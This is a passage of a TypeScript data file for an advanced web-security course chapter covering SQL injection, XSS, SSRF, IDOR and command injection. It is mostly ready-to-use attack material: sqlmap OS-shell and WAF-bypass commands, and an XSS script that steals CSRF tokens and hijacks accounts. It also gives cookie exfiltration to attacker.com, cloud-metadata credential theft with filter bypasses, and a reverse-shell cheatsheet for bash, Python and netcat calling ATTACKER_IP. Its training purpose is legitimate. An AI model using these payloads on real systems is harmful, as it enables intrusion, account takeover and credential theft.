import { RoadmapChapter } from "./types";

export const chapter6: RoadmapChapter = {
  id: "ch-6-owasp-top-10",
  chapterNumber: 6,
  title: "OWASP Top 10 Core Web Vulnerabilities Deep Dive",
  subtitle: "SQL Injection, Cross-Site Scripting (XSS), SSRF, IDOR, Command Injection & Malicious File Uploads",
  badge: "Chapter 6 • Vulnerability Exploitation",
  duration: "24 Hours • 6 In-Depth Lessons",
  difficulty: "Advanced",
  description:
    "The core battlefield of web application security. Master the physics of SQL Injection (In-Band, Blind, Error-based), Reflected, Stored, and DOM-based Cross-Site Scripting (XSS), Server-Side Request Forgery (SSRF) reaching AWS/GCP cloud metadata, Broken Object Level Authorization (IDOR/BOLA), Operating System Command Injection, and weaponized Polyglot file uploads to obtain root reverse shells.",
  iconName: "Bug",
  lessons: [
    {
      id: "l-6-1",
      lessonNumber: "6.1",
      title: "SQL Injection (SQLi): In-Band, Blind & Automated with SQLmap",
      duration: "4.5 Hours",
      badge: "SQLi Masterclass",
      summary:
        "Extracting entire database schemas through UNION-based, Error-based, Boolean Blind, and Time-based SQL Injection, followed by automated database dumping and OS shell acquisition via SQLmap.",
      studyNotes: [
        {
          heading: "The Mechanics of SQL Injection & Interpreter Confusion",
          subheading: "How untrusted user input alters the Abstract Syntax Tree (AST) of SQL queries",
          points: [
            "Root Cause: SQLi occurs when an application concatenates untrusted user input directly into a dynamic SQL query string instead of using parameterized queries (prepared statements). The database interpreter treats user-supplied data characters (such as single quotes `'` or double dashes `--`) as code commands.",
            "UNION-Based SQLi (In-Band): The fastest extraction method. An attacker appends `UNION SELECT ...` to execute a secondary query whose results are rendered directly on the webpage. Requirement 1: The injected query must return the exact same number of columns as the original query (determined via `ORDER BY 1, 2, 3...`). Requirement 2: The data types of corresponding columns must be compatible.",
            "Error-Based SQLi: When queries are not reflected on screen but verbose database error messages are displayed. Attackers intentionally trigger runtime errors (e.g. `EXTRACTVALUE()` in MySQL or `CAST(version() AS int)` in PostgreSQL) that embed the query results inside the error message.",
            "Boolean & Time-Based Blind SQLi: When the application returns zero errors and zero query data. Boolean Blind infers data bit-by-bit based on true/false page differences; Time-Based Blind uses conditional delays (`pg_sleep(5)`, `WAITFOR DELAY '0:0:5'`) to verify conditions based on server response duration.",
          ],
          callout: "The definitive defense against SQL Injection is Parameterized Queries (Prepared Statements). When using prepared statements, the database engine compiles the SQL query structure *before* inserting user parameters. Even if the user submits `' OR 1=1 --`, the engine treats it purely as a literal text string.",
          diagramOrCode: `+-------------------------------------------------------------+
|               UNION-BASED SQL INJECTION ATTACK FLOW         |
+-------------------------------------------------------------+
 Vulnerable PHP Code:
   $query = "SELECT id, title, content FROM posts WHERE id = " . $_GET['id'];

 Attacker Input:
   id = -1 UNION SELECT 1, user(), version()-- -

 Executed Database Query:
   SELECT id, title, content FROM posts WHERE id = -1
   UNION SELECT 1, user(), version()-- -

 Result on Screen:
   Title: root@localhost
   Content: 8.0.32-MySQL`
        },
        {
          heading: "SQLmap Automation & Weaponized OS Shells",
          subheading: "Automating schema dumps and escalating to Remote Code Execution",
          points: [
            "Session Management: Pass your authenticated session cookie via `--cookie=\"session=...\"` to audit behind authentication walls.",
            "DBMS Specific Tuning: If you know the backend is MySQL, pass `--dbms=mysql` to skip testing for Oracle and MSSQL, speeding up the scan by 400%.",
            "Tamper Scripts: When facing Web Application Firewalls (Cloudflare, ModSecurity), use `--tamper=space2comment,between,randomcase` to encode payloads and bypass keyword pattern filters.",
            "Spawning an OS Shell (`--os-shell`): If the database user is `root` or `sa` and possesses write permissions (`FILE` privilege in MySQL), SQLmap can upload a PHP backdoor directly into the web root (`INTO OUTFILE '/var/www/html/shell.php'`) to deliver an interactive operating system shell.",
          ],
          callout: "Running `--os-shell` creates persistent artifacts on the target file system. In professional client penetration tests, always document the exact directory where the temporary backdoor was uploaded and ensure it is cleanly deleted after the assessment.",
          diagramOrCode: `SQLMAP ESSENTIAL COMMANDS:
  # Basic automated audit:
  sqlmap -u "https://target.com/product.php?id=1" --batch --dbs
  
  # Audit using captured Burp request file:
  sqlmap -r burp_request.txt -p parameter_name --level=5 --risk=3
  
  # Dump specific table contents:
  sqlmap -r burp_request.txt -D users_db -T accounts --dump
  
  # Attempt OS shell escalation:
  sqlmap -r burp_request.txt --os-shell`
        }
      ],
      keyTopics: [
        "In-Band UNION-Based SQL Injection Mechanics: UNION-based SQLi occurs when user input is concatenated directly into a database query whose results are rendered in the HTTP response. An attacker injects 'UNION SELECT ...' to execute a secondary query that extracts data from arbitrary database tables. Exploitation requires matching the exact number of columns returned by the original query (discovered via ORDER BY) and ensuring data types are compatible with reflected fields.",
        "Error-Based SQL Injection & Database Exception Harvesting: When query results are not reflected on the webpage, but the application displays verbose database error messages to users, Error-Based SQLi is utilized. Attackers craft inputs that intentionally trigger runtime exceptions (such as EXTRACTVALUE() or XMLType in Oracle/MySQL, or CAST() in PostgreSQL) containing the query results inside the error text. This allows extracting confidential data one string at a time directly from server error banners.",
        "Boolean-Blind & Time-Based Blind Inference Techniques: Blind SQLi occurs when an application suppresses all query reflections and database error messages. Boolean-Blind injection infers database contents bit-by-bit by observing differences in application response content (such as 'User found' vs 'User not found' based on 'AND SUBSTRING(password,1,1)='a''). Time-Based Blind injection forces the database engine to sleep (e.g. pg_sleep(5) or WAITFOR DELAY '0:0:5') when a condition is true, inferring data based purely on HTTP response latency.",
        "Automated Database Exploitation & Dumping with SQLmap: SQLmap is the industry-standard automated penetration testing tool that detects and exploits all six SQL injection techniques across all major database engines (MySQL, Oracle, PostgreSQL, Microsoft SQL Server). SQLmap automates fingerprinting DBMS versions, enumerating databases (--dbs), dumping table schemas, and cracking extracted password hashes using dictionary attacks. Passing '--tamper=space2comment,randomcase' obfuscates payloads to bypass Web Application Firewalls.",
        "Escalating Database Access to OS Command Shells (--os-shell): If the database server process runs with administrative privileges (such as root in MySQL or sa in MSSQL) and possesses file system write permissions, SQLmap can escalate directly to an operating system shell. Using '--os-shell', SQLmap injects a custom web backdoor into the target's web root (via SELECT ... INTO OUTFILE '/var/www/html/shell.php') or enables xp_cmdshell in MSSQL. This grants the attacker an interactive command-line shell directly on the database host.",
      ],
      terminalCommands: [
        "sqlmap -u 'https://target.com/item.php?id=10' --dbs --batch",
        "sqlmap -r request.txt -p id --level 5 --risk 3 --os-shell",
        "sqlmap -u 'https://target.com/search' --data='q=test' --tamper=space2comment",
      ],
      proTips: [
        "When testing for SQLi manually, test arithmetic evaluation: `id=4-1`. If the page displays item #3 instead of an error, arithmetic is being evaluated dynamically by the database!",
        "Always use `--random-agent` with SQLmap to avoid getting immediately blocked by ModSecurity rules targeting the default 'sqlmap/1.x' User-Agent.",
      ],
    },
    {
      id: "l-6-2",
      lessonNumber: "6.2",
      title: "Cross-Site Scripting (XSS): Reflected, Stored & DOM-Based",
      duration: "4.5 Hours",
      badge: "XSS Masterclass",
      summary:
        "Weaponizing JavaScript injection to hijack authenticated sessions, steal anti-CSRF tokens, log keystrokes, and bypass modern Content Security Policies (CSP).",
      studyNotes: [
        {
          heading: "The Three XSS Flavors & Execution Contexts",
          subheading: "Understanding the difference between server-side reflection and client-side DOM sinks",
          points: [
            "Reflected XSS (Non-Persistent): Untrusted input is submitted in an HTTP request (e.g. search query) and immediately reflected in the server's HTML response without sanitization. Requires social engineering (tricking a victim into clicking a malicious link).",
            "Stored XSS (Persistent / Second-Order): Untrusted input is permanently stored in the backend database (e.g. comment section, profile bio, forum post). Every user who views the page executes the malicious script automatically — ideal for self-propagating worms.",
            "DOM-Based XSS (Client-Side Only): The vulnerability exists entirely within the client-side JavaScript itself. Data flows from a DOM 'Source' (like `location.search` or `document.referrer`) into an execution 'Sink' (like `eval()`, `innerHTML`, or `document.write()`) without ever touching the server backend.",
            "Context is Everything: An XSS payload differs completely depending on where input lands: HTML context (`<p>USER_INPUT</p>`), Attribute context (`<input value=\"USER_INPUT\">`), or JavaScript context (`var name = 'USER_INPUT';`).",
          ],
          callout: "XSS is not just about popping `alert(1)`. Modern attackers use XSS to steal authentication session cookies (`document.cookie`), silently force the victim's browser to transfer funds via background `fetch()` requests, or turn the victim's browser into a persistent zombie proxy.",
          diagramOrCode: `+-------------------------------------------------------------+
|               DOM-BASED XSS SOURCE-TO-SINK PIPELINE          |
+-------------------------------------------------------------+
 Source (Untrusted User Data):
   URL: https://target.com/page.html#<img src=x onerror=alert(1)>
        |
        v
 Client-Side JavaScript (Vulnerable Sink Execution):
   var hash = location.hash.substring(1);  <-- SOURCE
   document.getElementById("content").innerHTML = hash;  <-- SINK
        |
        v
 Result: Browser parses <img> tag, triggers onerror handler, executes JS!`
        },
        {
          heading: "Content Security Policy (CSP) Bypasses & Session Hijacking",
          subheading: "Evading browser-enforced security policies and weaponizing payloads",
          points: [
            "What is CSP? An HTTP response header (`Content-Security-Policy`) that tells browsers which domains are trusted sources for script execution, blocking inline `<script>` tags by default.",
            "CSP Bypass via JSONP Endpoints: If CSP allows `script-src https://trusted-cdn.com`, finding an open JSONP endpoint on that trusted domain (`https://trusted-cdn.com/api?callback=alert(1)`) executes arbitrary code cleanly.",
            "Base-URI Injection: If the CSP directive lacks `base-uri 'self'`, an attacker can inject `<base href=\"https://attacker.com/\">`, forcing the browser to load all relative scripts (`/js/app.js`) directly from the attacker's server.",
            "Stealing Protected Cookies: If a session cookie lacks the `HttpOnly` flag, JavaScript can read it directly (`fetch('https://attacker.com/steal?c=' + document.cookie)`). If `HttpOnly` is present, attackers use XSS to perform client-side request forgery (CSRF) from within the authenticated session context.",
          ],
          callout: "Never submit `alert(1)` in a bug bounty report! To earn high payouts, demonstrate real impact: craft a Proof of Concept that changes the victim's email address or extracts their sensitive account profile data via a background `fetch()` request.",
          diagramOrCode: `HIGH-IMPACT XSS WEAPONIZATION SCRIPT:
// Steal Anti-CSRF token and change victim's account email:
fetch('/api/user/profile')
  .then(res => res.json())
  .then(data => {
    var csrfToken = data.csrf_token;
    fetch('/api/user/change-email', {
      method: 'POST',
      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken},
      body: JSON.stringify({email: 'attacker@evil.com'})
    });
  });`
        }
      ],
      keyTopics: [
        "Reflected Cross-Site Scripting (XSS) Mechanics: Reflected XSS occurs when untrusted user data submitted in an HTTP request (such as a search query or URL parameter) is immediately reflected in the server's HTML response without sanitization or output encoding. Because the payload is not stored permanently on the server, attackers craft weaponized URLs containing the payload and trick victims into clicking them via social engineering. When the victim loads the link, their browser executes the injected JavaScript within the victim's session context.",
        "Stored Cross-Site Scripting (Persistent XSS) Threats: Stored XSS occurs when an application accepts user input (such as a user profile bio, product review, or forum comment) and stores it permanently in the backend database without sanitization. Whenever any other user, customer, or administrator views the infected page, the malicious script executes automatically in their browser without requiring any link-clicking. Stored XSS represents the highest-severity XSS tier, enabling self-propagating worms and mass administrative account hijacking.",
        "DOM-Based Cross-Site Scripting & Client-Side Execution Sinks: DOM XSS occurs entirely within the client-side browser DOM without the malicious payload ever being transmitted to or reflected by the web server backend. Vulnerabilities arise when client-side JavaScript reads data from an untrusted 'Source' (like location.search, location.hash, or document.referrer) and passes it directly to an execution 'Sink' (like innerHTML, eval(), or document.write()). Modern Single-Page Applications (React, Angular) must sanitize client-side routing to prevent DOM-based execution.",
        "Content Security Policy (CSP) Bypasses & JSONP Exploitation: Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, images, stylesheets) that a browser is permitted to load for a given page, blocking inline scripts by default. Attackers bypass restrictive CSP rules by leveraging trusted domains: if the CSP allows scripts from a trusted CDN that hosts an unauthenticated JSONP endpoint (e.g. ?callback=alert), the attacker passes their payload through the trusted domain. Missing 'base-uri' directives also allow injecting <base> tags to hijack script paths.",
        "Session Hijacking & Client-Side Request Forgery via XSS: The true impact of XSS extends far beyond basic alert boxes. If session cookies lack the 'HttpOnly' flag, injected JavaScript reads them directly via document.cookie and exfiltrates them to an attacker server. Even if HttpOnly is present, the attacker's script can issue background asynchronous fetch() requests directly from the victim's authenticated browser, transferring money, altering email addresses, or adding new administrator accounts without requiring cookie theft.",
      ],
      terminalCommands: [
        "# Testing DOM XSS using Headless Chrome or Playwright/Puppeteer:",
        "node -e 'const puppeteer = require(\"puppeteer\"); ...'",
      ],
      proTips: [
        "Use modern event-handler payloads: `<svg onload=alert(1)>` or `<input autofocus onfocus=alert(1)>` to bypass naive regex filters that only block `<script>` tags.",
        "When cookies have `HttpOnly` flags, use XSS to execute actions directly on the user's behalf via `fetch()` without needing to read the cookie value.",
      ],
    },
    {
      id: "l-6-3",
      lessonNumber: "6.3",
      title: "Server-Side Request Forgery (SSRF) & Cloud Metadata Exploitation",
      duration: "4 Hours",
      badge: "SSRF Masterclass",
      summary:
        "Coercing backend application servers into making unauthorized requests to internal cloud metadata instances (169.254.169.254), internal Kubernetes APIs, and loopback services.",
      studyNotes: [
        {
          heading: "The Mechanics of Server-Side Request Forgery (SSRF)",
          subheading: "Abusing server functionality to reach internal networks hidden behind firewalls",
          points: [
            "Why SSRF Happens: Modern web applications frequently fetch external resources: downloading an image from a URL, fetching webhooks, generating PDF reports from web pages, or importing files. If the application server fails to validate the supplied URL, an attacker can specify internal IP addresses.",
            "The Trust Boundary Breach: Even though an attacker's laptop cannot access `127.0.0.1` or `10.0.0.5` on the target company's network, the target web server SITS INSIDE that trusted corporate perimeter.",
            "Cloud Metadata Services (IMDSv1): In AWS, GCP, and Azure, cloud virtual machines query a link-local address (`http://169.254.169.254`) to fetch VM configurations. Under AWS IMDSv1, requesting `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>` returns temporary AWS Secret Access Keys and Session Tokens!",
            "Escalation to Cloud Account Takeover: An attacker inputs the stolen AWS credentials into their local terminal (`aws configure`), immediately gaining full control over target S3 buckets, EC2 instances, and RDS databases.",
          ],
          callout: "The Capital One breach (affecting 100+ million customers) was executed via SSRF against an AWS EC2 server running an open-source WAF, allowing the attacker to steal IAM role credentials and exfiltrate 30+ GB of credit card data from S3 buckets.",
          diagramOrCode: `+-------------------------------------------------------------+
|               SSRF CLOUD METADATA EXPLOITATION FLOW          |
+-------------------------------------------------------------+
 Attacker sends:
   POST /fetch-avatar HTTP/1.1
   {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
        |
        v
 Target Web Server (EC2) queries its local hypervisor
        |
        v
 [ AWS Hypervisor Link-Local API ]
        |
        v Returns:
 {
   "AccessKeyId" : "ASIAIOSFODNN7EXAMPLE",
   "SecretAccessKey" : "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
   "Token" : "AQoDYXdzEJr1...=="
 }
 Result: Full compromise of target AWS Cloud Environment!`
        },
        {
          heading: "Bypassing SSRF Blacklists & DNS Rebinding",
          subheading: "Circumventing naive IP filters and localhost restrictions",
          points: [
            "Localhost IP Obfuscation: Naive filters block the string `127.0.0.1` or `localhost`. Bypass using alternative notations: Decimal format (`http://2130706433`), Hex format (`http://0x7f000001`), Octal format (`http://017700000001`), or shorthand (`http://127.1`).",
            "IPv6 Loopback: Request `http://[::1]/` or `http://[0:0:0:0:0:0:0:1]/`.",
            "Open Redirect Chaining: If the application only allows URLs starting with `https://trusted.com`, find an open redirect on `trusted.com` (`https://trusted.com/redir?url=http://169.254.169.254`). The backend server follows the 302 redirect and hits the metadata API.",
            "DNS Rebinding Attacks: Register a domain that initially resolves to an external IP (`1.2.3.4`) with a TTL of 1 second. When the application validates the URL, it passes. One second later, when the application fetches the URL, the DNS server returns `127.0.0.1` or `169.254.169.254`, bypassing the firewall completely!",
          ],
          callout: "AWS IMDSv2 Defense: AWS introduced IMDSv2, which requires a `X-aws-ec2-metadata-token` header acquired via a `PUT` request before metadata can be read. Because most basic SSRF vectors only issue `GET` requests, IMDSv2 effectively neutralizes simple metadata theft.",
          diagramOrCode: `SSRF BYPASS CHEATSHEET:
  Standard:      http://169.254.169.254/latest/meta-data/
  Enclosed:      http://[::ffff:169.254.169.254]/
  Hex:           http://0xa9fea9fe/
  Decimal:       http://2852039166/
  DNS Alias:     http://instance-data/
  GCP Metadata:  http://metadata.google.internal/computeMetadata/v1/
                 (Requires header: Metadata-Flavor: Google)`
        }
      ],
      keyTopics: [
        "Server-Side Request Forgery (SSRF) Mechanics & Trust Boundaries: SSRF occurs when a backend web application fetches external resources (such as importing an image from a URL, generating a PDF from a link, or validating webhooks) based on user-supplied input without proper validation. Because the outgoing HTTP request originates from the trusted application server, the request bypasses external perimeter firewalls. Attackers supply internal IP addresses (such as 127.0.0.1 or internal subnets 10.0.0.0/8), coercing the server to scan and exploit internal corporate services.",
        "Cloud Instance Metadata Service (IMDSv1) Exploitation: In major cloud environments (AWS EC2, Google Cloud, Azure, DigitalOcean), virtual machines query a non-routable link-local IP address (http://169.254.169.254) to fetch runtime configurations. Under AWS IMDSv1, sending an SSRF request to http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> returns temporary AWS AccessKeyId, SecretAccessKey, and Token credentials. Attackers import these credentials into their local terminal, achieving complete administrative takeover of the target's cloud infrastructure.",
        "Bypassing Localhost & Private IP Blacklists: Developers frequently deploy naive blacklist regexes that block the literal strings '127.0.0.1' or 'localhost'. Attackers bypass these filters using alternative IP encodings: Decimal notation (http://2130706433/), Hexadecimal notation (http://0x7f000001/), Octal notation (http://017700000001/), or IPv6 loopback (http://[::1]/). Furthermore, open redirect vulnerabilities on trusted domains can be chained: the application validates a whitelisted URL, which then redirects the backend server directly to internal IPs.",
        "DNS Rebinding Attacks for SSRF Evasion: DNS Rebinding defeats IP-based whitelisting when an application validates an IP address before fetching it. The attacker registers a domain whose custom DNS server returns a public IP address (1.2.3.4) with a Time-To-Live (TTL) of 1 second. When the web application validates the domain, it resolves to the benign public IP and passes validation; one second later, when the application fetches the data, the DNS server returns 169.254.169.254, bypassing the security gate completely.",
        "Blind SSRF Detection via Out-of-Band (OAST) Collaborator Listeners: In many applications, the backend server processes the requested URL asynchronously in a background worker queue, returning zero response data back to the user. To detect Blind SSRF, researchers inject unique Burp Collaborator or Interactsh subdomains into suspected URL parameters. When the internal server issues a DNS lookup or HTTP GET request to the Collaborator listener, the interaction is logged, providing undeniable proof of SSRF.",
      ],
      terminalCommands: [
        "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "python3 -c 'import socket,struct; print(struct.unpack(\"!I\", socket.inet_aton(\"127.0.0.1\"))[0])'",
      ],
      proTips: [
        "Test for SSRF in PDF generators: if a web app converts HTML to PDF, inject `<iframe src=\"http://169.254.169.254/latest/meta-data/\"></iframe>` to print AWS credentials directly into the PDF!",
        "When attacking GCP, look for headers like `Metadata-Flavor: Google`; without this header, GCP metadata endpoints reject requests.",
      ],
    },
    {
      id: "l-6-4",
      lessonNumber: "6.4",
      title: "Insecure Direct Object References (IDOR / BOLA)",
      duration: "3.5 Hours",
      badge: "Access Control",
      summary:
        "Exploiting Broken Object Level Authorization (BOLA) across REST APIs and GraphQL endpoints to view, modify, and delete records belonging to unauthorized tenants.",
      studyNotes: [
        {
          heading: "The Architecture of Broken Access Control",
          subheading: "Why IDOR remains the #1 highest-payout vulnerability in bug bounty history",
          points: [
            "Root Cause: IDOR occurs when an application uses user-supplied input to access objects directly in storage (e.g. database primary keys like `/api/documents/1042`), but fails to verify whether the currently authenticated user has legal authorization to access that specific record.",
            "Horizontal Privilege Escalation: Accessing resources belonging to a peer user at the exact same privilege tier (e.g. User A accessing User B's private tax documents or bank receipts).",
            "Vertical Privilege Escalation: A low-privilege user accessing functionality or records reserved strictly for high-privilege administrative roles (e.g. standard user calling `/api/admin/system/backup`).",
            "UUIDs vs Sequential IDs: Sequential integer IDs (`id=1001`, `id=1002`) are trivial to enumerate with Intruder. However, even if an application uses UUIDs (`id=550e8400-e29b-41d4-a716-446655440000`), if the backend lacks authorization checks, leaking the UUID elsewhere (in public comments, profile URLs, or search APIs) still yields full IDOR exploitation!",
          ],
          callout: "Never assume an API is secure just because it uses complex 128-bit UUIDs! Look for public search endpoints, team invite APIs, or exported PDF URLs where those UUIDs are leaked in plaintext to normal users.",
          diagramOrCode: `+-------------------------------------------------------------+
|               INSECURE DIRECT OBJECT REFERENCE (IDOR)       |
+-------------------------------------------------------------+
 Attacker logs in as User A (Account ID: 501)
 Browser requests:
   GET /api/v1/invoices/501 HTTP/1.1  ==> Server returns User A invoice
        |
        v (Attacker tampers ID in Burp Repeater)
   GET /api/v1/invoices/502 HTTP/1.1
        |
        v
 [ VULNERABLE BACKEND LOGIC ]
   SELECT * FROM invoices WHERE id = 502;
   (Fails to check: AND user_id = session.current_user_id)
        |
        v
 Server returns User B's confidential invoice & credit card details!`
        },
        {
          heading: "Advanced IDOR Mutation & HTTP Verb Tampering",
          subheading: "Circumventing partial authorization controls across modern APIs",
          points: [
            "HTTP Verb Tampering: An application might check authorization on `GET /api/users/10`, but fails to enforce authorization on `PUT /api/users/10` or `DELETE /api/users/10`.",
            "Content-Type Swapping: If JSON endpoints enforce strict tenant validation (`Content-Type: application/json`), try changing the request to XML (`application/xml`) or URL-encoded form data (`application/x-www-form-urlencoded`). Legacy parser fallbacks often bypass authorization filters.",
            "Parameter Pollution (HPP): Submitting duplicate parameters (`GET /api/invoice?id=MY_ID&id=VICTIM_ID`) to trick web servers where the WAF checks the first ID but the backend database processes the second ID.",
            "Mass Assignment (Over-Posting): When updating your personal profile (`PUT /api/user/me`), inject administrative attributes into the JSON body: `{\"role\": \"admin\", \"is_verified\": true, \"account_balance\": 999999}`.",
          ],
          callout: "Mass Assignment is an attacker's dream. Always inspect what JSON keys the server returns in a `GET /api/user/me` response. Try copying every single key (including `role`, `tier`, `permissions`) into your next `PUT` or `PATCH` profile update request.",
          diagramOrCode: `MASS ASSIGNMENT PRIVILEGE ESCALATION:
Normal Client Request:
  PUT /api/v1/users/profile
  {"first_name": "John", "last_name": "Doe"}

Attacker Modified Request:
  PUT /api/v1/users/profile
  {
    "first_name": "John",
    "last_name": "Doe",
    "is_admin": true,
    "role": "SuperAdministrator",
    "organization_id": 1
  }`
        }
      ],
      keyTopics: [
        "Insecure Direct Object References (IDOR / BOLA) Architecture: IDOR occurs when an application uses user-supplied input to directly access an object in storage (such as database primary keys, account numbers, or filenames) without verifying that the currently logged-in user possesses authorization to access that specific record. Because modern REST APIs frequently expose database IDs in routes (e.g. /api/v1/users/1042/profile), tampering with the identifier allows unauthorized users to read, modify, or delete sensitive data belonging to any other user in the system.",
        "Horizontal vs Vertical Privilege Escalation Vectors: Horizontal privilege escalation occurs when an attacker accesses resources belonging to another user operating at the exact same privilege tier (e.g. Employee A accessing Employee B's private payroll receipts by altering the document ID). Vertical privilege escalation occurs when an unprivileged standard user accesses administrative functionality or data reserved strictly for elevated roles (e.g. standard user altering their account tier to 'Admin' by modifying an API parameter).",
        "HTTP Verb Tampering & Method Spoofing: Application access control filters are frequently configured with flawed routing logic that validates permissions on standard GET requests, but fails to check authorization on alternative HTTP methods. Changing a request from GET /api/documents/45 to PUT, PATCH, or DELETE /api/documents/45 often bypasses security middleware. Furthermore, testing HTTP method override headers (such as X-HTTP-Method-Override: PUT) tricks backend frameworks into executing privileged actions without validation.",
        "Mass Assignment & JSON Attribute Over-Posting: Mass Assignment occurs when a backend framework (Ruby on Rails, Spring Boot, Node.js) automatically binds incoming JSON request parameters directly into database model objects without whitelisting permitted fields. When updating a standard user profile (PUT /api/user/me), an attacker injects hidden administrative properties: '{\"role\": \"admin\", \"is_verified\": true, \"account_balance\": 100000}'. If the backend binds these attributes blindly, the user is instantly granted administrative privileges.",
        "UUID Enumeration & Leaked Identifier Harvesting: Many modern web architectures attempt to mitigate IDOR by replacing sequential integer IDs with 128-bit Universally Unique Identifiers (UUIDs), assuming they are impossible to guess. However, if the backend lacks authorization checks, leaking the UUID anywhere in the application (in public forum posts, search APIs, shared links, or PDF metadata) still enables full unauthorized access. Attackers scrape UUIDs from public endpoints and replay them against private API routes.",
      ],
      terminalCommands: [
        "# Automated IDOR parameter fuzzing with ffuf:",
        "ffuf -w ids.txt -u 'https://target.com/api/orders/FUZZ' -H 'Cookie: session=USER_TOKEN' -mc 200",
      ],
      proTips: [
        "Always maintain two test accounts (Account A and Account B). Attempt to view, edit, and delete Account B's resources using Account A's cookies.",
        "Check mobile API endpoints (`/api/mobile/v1/`); developers frequently forget to implement access control checks on APIs built exclusively for mobile apps.",
      ],
    },
    {
      id: "l-6-5",
      lessonNumber: "6.5",
      title: "Command Injection, RCE & Reverse Shell Weaponization",
      duration: "4 Hours",
      badge: "RCE Weaponization",
      summary:
        "Exploiting arbitrary OS command injection, bypassing character blacklists and whitespace filters, and catching interactive TTY reverse shells in Netcat.",
      studyNotes: [
        {
          heading: "OS Command Injection Mechanics & Shell Metacharacters",
          subheading: "How unsanitized system calls allow arbitrary Linux and Windows command execution",
          points: [
            "Root Cause: Occurs when an application passes unsanitized user data directly to a system shell execution function (e.g. `system()`, `exec()`, `passthru()`, `shell_exec()` in PHP, or `child_process.exec()` in Node.js).",
            "Command Chaining Metacharacters: Attackers append shell operators to execute secondary commands: `;` (sequential execution), `&&` (execute if previous succeeded), `||` (execute if previous failed), `|` (pipe output), and backticks `` `command` `` or `$()` (command substitution).",
            "Blind Command Injection: When the application executes your command but does not render the stdout/stderr in the HTTP response. Verify using time delays (`ping -c 5 127.0.0.1` or `sleep 10`) or out-of-band DNS interactions (`curl http://attacker.collaborator.net`).",
            "Data Exfiltration: If the output is blind, exfiltrate command results via DNS queries (`curl http://$(whoami).collaborator.net`) or netcat pipes (`cat /etc/shadow | nc attacker.com 4444`).",
          ],
          callout: "A single command injection vulnerability represents game over for the target server. It immediately grants the attacker an interactive command-line shell running under the privileges of the web service account (e.g., `www-data` or `IIS_IUSRS`).",
          diagramOrCode: `+-------------------------------------------------------------+
|               COMMAND INJECTION EXECUTION FLOW              |
+-------------------------------------------------------------+
 Vulnerable PHP Code:
   $ip = $_GET['ip'];
   system("ping -c 3 " . $ip);

 Attacker Input:
   ip = 127.0.0.1; whoami; cat /etc/passwd

 Executed Shell Command:
   ping -c 3 127.0.0.1; whoami; cat /etc/passwd
                         ^^^^^^  ^^^^^^^^^^^^^^^
 Result: Ping runs, followed immediately by arbitrary system commands!`
        },
        {
          heading: "Evasion Techniques & Interactive TTY Reverse Shells",
          subheading: "Bypassing WAF character filters and stabilizing raw terminal connections",
          points: [
            "Bypassing Whitespace Restrictions: When spaces are filtered, use the internal field separator `${IFS}` (e.g., `cat\${IFS}/etc/passwd`), brace expansion (`{cat,/etc/passwd}`), or redirection (`cat</etc/passwd`).",
            "Bypassing Blacklisted Slash `/` or Keywords: Use base64 decoding: `echo d2hvYW1p | base64 -d | sh` or string concatenation (`c'a't /e't'c/p'a'sswd`).",
            "The Reverse Shell: Forcing the victim server to initiate an outbound TCP socket connection back to your listening Netcat listener (`nc -lvnp 4444`).",
            "Stabilizing Dumb Shells to Fully Interactive TTY: Dumb shells lack tab-completion, arrow keys, and kill on `Ctrl+C`. Upgrade using Python PTY: `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`, background with `Ctrl+Z`, run `stty raw -echo; fg`, and export `TERM=xterm`.",
          ],
          callout: "Never submit a Command Injection report using `reboot` or `rm -rf /`! In professional bug bounty and authorized pentesting, ethical proofs of concept use benign commands like `whoami`, `id`, or `cat /etc/hostname`.",
          diagramOrCode: `REVERSE SHELL CHEATSHEET:
  1. Classic Bash TCP:
     bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  
  2. Python3 Reverse Shell:
     python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  
  3. Netcat Traditional:
     nc -e /bin/bash ATTACKER_IP 4444`
        }
      ],
      keyTopics: [
        "OS Command Injection Mechanics & Shell Metacharacters: Command Injection occurs when an application passes unsanitized user input directly to a system shell execution function (such as system(), exec(), passthru() in PHP, or child_process.exec() in Node.js). Attackers append shell metacharacters to break out of the intended command context and chain arbitrary secondary commands: ';' (sequential execution), '&&' (conditional execution), '||' (execute on failure), '|' (pipe), and backticks or '$()' (command substitution).",
        "Blind Command Injection & Out-of-Band Data Exfiltration: When an application executes injected commands in a background daemon without returning stdout or stderr in the HTTP response, the vulnerability is blind. Attackers confirm blind execution using time-delay commands: injecting '; sleep 10;' and verifying that the HTTP response duration increases by exactly 10 seconds. For data exfiltration, attackers pipe command outputs through DNS lookups (curl http://$(whoami).collaborator.net) or netcat TCP streams.",
        "Bypassing Whitespace & Character Blacklist Filters: Web Application Firewalls frequently attempt to block command injection by stripping space characters or blacklisting forward slashes. Attackers bypass whitespace filters in Linux using the Internal Field Separator environment variable ('cat${IFS}/etc/passwd'), brace expansion ('{cat,/etc/passwd}'), or redirection ('cat</etc/passwd'). Blacklisted keywords are bypassed using Base64 encoding ('echo d2hvYW1p | base64 -d | sh') or variable concatenation.",
        "Weaponizing Reverse Shells across Linux & Windows: A reverse shell forces the target server to initiate an outbound TCP socket connection back to an attacker-controlled Netcat listener (nc -lvnp 4444). Common one-line payloads include Bash TCP sockets ('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'), standalone Python scripts, and PowerShell sockets on Windows. Initiating an outbound connection is vastly superior to binding a local port, as stateful egress firewalls permit outbound traffic while blocking inbound ports.",
